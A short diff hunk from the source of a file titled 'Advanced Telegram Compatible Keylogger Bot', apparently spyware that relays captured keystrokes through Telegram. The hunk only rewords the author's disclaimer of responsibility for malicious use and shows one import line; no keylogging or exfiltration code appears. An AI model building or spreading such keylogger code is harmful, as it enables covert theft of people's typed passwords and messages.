@@ -1,5 +1,5 @@
 # Advanced Telegram Compatible Keylogger Bot by Cem Baran Tunc
-# Statement of Responsibility: I am NOT responsible for any malicious use of this code nor any consequences that caused by the one who uses this code partially or fully.
+# Statement of Responsibility: I am NOT responsible for any malicious use of this code nor any kind of consequences that caused by the one who uses this code partially or fully.
 
 # importing necessary features from various libraries...
 from os import remove
